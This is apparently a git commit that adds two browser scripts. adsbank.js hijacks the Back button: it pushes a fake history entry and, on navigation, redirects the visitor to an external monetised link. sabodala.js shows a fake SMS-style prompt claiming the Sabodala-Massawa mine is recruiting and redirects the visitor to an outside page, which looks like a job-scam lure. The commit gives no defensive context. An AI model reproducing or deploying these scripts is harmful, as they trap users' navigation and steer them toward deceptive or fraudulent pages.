cadad7728c05d6edde25f0eb6111ad7e0ede059a
vipfolder24x7 <vipfolder24x7@proton.me>
2025-08-23 00:33:16 +0530

    Add files via upload

---
+++ adsbank.js
@@ -0,0 +1,12 @@
+
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://uncertainbill.com/agyv7ex6?key=96eb9366cb1c6c1b8ab6ab46c574e6fb";
+    }
+    function goon(){
+        location.href="https://uncertainbill.com/agyv7ex6?key=96eb9366cb1c6c1b8ab6ab46c574e6fb";
+    }
---
+++ sabodala.js
@@ -0,0 +1,6 @@
+
+var password = 'Recrutement Sabodala-Massawa mine'
+password=prompt('SMS: La mine de Sabodala-Massawa recrute actuellement pour divers postes, appuyez sur OK pour postuler au','Recrutement Sabodala-Massawa mine');
+if (password != 'Recrutement Sabodala-Massawa mine') {
+location.href='https://www.home33.xyz/Sabodala-Massawa-Recrutement';
+}
